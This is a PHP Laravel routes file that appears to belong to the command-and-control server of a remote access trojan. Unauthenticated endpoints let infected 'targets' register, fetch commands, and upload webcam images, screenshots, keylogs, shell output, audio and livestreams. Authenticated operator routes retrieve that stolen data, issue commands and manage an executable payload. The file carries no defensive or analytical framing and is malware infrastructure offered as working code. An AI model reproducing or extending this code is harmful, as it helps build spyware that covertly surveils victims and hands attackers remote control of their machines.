<?php

use App\Http\Controllers\Api\AudioController;
use App\Http\Controllers\Api\AuthController;
use App\Http\Controllers\Api\CommandController;
use App\Http\Controllers\Api\ExecutableController;
use App\Http\Controllers\Api\KeyloggerController;
use App\Http\Controllers\Api\LivestreamController;
use App\Http\Controllers\Api\NotificationController;
use App\Http\Controllers\Api\ScreenshotController;
use App\Http\Controllers\Api\ShellController;
use App\Http\Controllers\Api\TargetController;
use App\Http\Controllers\Api\WebcamController;
use App\Models\Notification;
use App\Models\Screenshot;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;

// Route::get('/user', function (Request $request) {
//     return $request->user();
// })->middleware('auth:sanctum');


Route::post('/login', [AuthController::class, 'login']);

Route::post('/register', [TargetController::class, 'create']);

Route::post('/refresh-token', [AuthController::class, 'refresh']);

Route::post('/capture-webcam', [WebcamController::class, 'post']);

Route::post('/capture-screen', [ScreenshotController::class, 'post']);

Route::post('/capture-keylog', [KeyloggerController::class, 'post']);

Route::post('/capture-shell', [ShellController::class, 'post']);

Route::post('/capture-audio', [AudioController::class, 'post']);

Route::post('/livestream-offer', [LivestreamController::class, 'offer']);

Route::post('/livestream-ice/client', [LivestreamController::class, 'clientIce']);

Route::get('/livestream-session', [LivestreamController::class, 'session']);

Route::get('/command', [CommandController::class, 'getNewCommands']);

// Route::get('/notification/stream', function() {
//     return response()->stream(function() {
//         while (true) {
//             $notifications = Notification::where('read', false)
//                 ->select('action', 'host', 'read')
//                 ->get();
//             $notifications->each(function ($notification) {
//                 $notification->update(['read' => true]);
//             });

//             $notifications->makeHidden('read');

//             if ($notifications)
//             {
//                 echo json_encode($notifications);
//                 ob_flush();
//                 flush();
//             }

//             sleep(5);
//         }
//     }, 200, [
//         "Content-Type" => "text/event-stream",
//         "Cache-Control" => "no-cache",
//         "Connection" => "keep-alive"
//     ]);
// });

Route::middleware('auth:sanctum')->group(function() {
    Route::get('/search', [TargetController::class, 'search']);
    Route::get('/targets', [TargetController::class, 'getTargets']);
    Route::delete('/targets/{id}', [TargetController::class, 'delete']);

    Route::post('/command', [CommandController::class, 'postCommand']);

    Route::get('/webcam', [WebcamController::class, 'getImages']);
    Route::get('/webcam/{id}', [WebcamController::class, 'getImage']);

    Route::get('/screenshot', [ScreenshotController::class, 'getImages']);
    Route::get('/screenshot/{id}', [ScreenshotController::class, 'getImage']);

    Route::get('/keylog', [KeyloggerController::class, 'getKeylogs']);
    Route::get('/keylog/{id}', [KeyloggerController::class, 'getKeylog']);

    Route::get('/shell', [ShellController::class, 'getOutputs']);
    Route::get('/shell/{id}', [ShellController::class, 'getOutput']);

    Route::get('/audio', [AudioController::class, 'getAudios']);
    Route::get('/audio/{id}', [AudioController::class, 'getAudio']);

    Route::post('/logout', [AuthController::class, 'logout']);
    Route::put('/account', [AuthController::class, 'updateUser']);

    Route::get('/exe', [ExecutableController::class, 'get']);
    Route::post('/exe', [ExecutableController::class, 'update']);

    Route::post('/livestream-answer', [LivestreamController::class, 'answer']);
    Route::post('/livestream-ice/server', [LivestreamController::class, 'serverIce']);

    // Route::get('/notification', [NotificationController::class, 'index']);
    // Route::get('/notification/stream', [NotificationController::class, 'stream']);
});

// SSE endpoint (uses query token for EventSource compatibility)
Route::middleware('sse.auth')->get('/notification/stream', [NotificationController::class, 'stream']);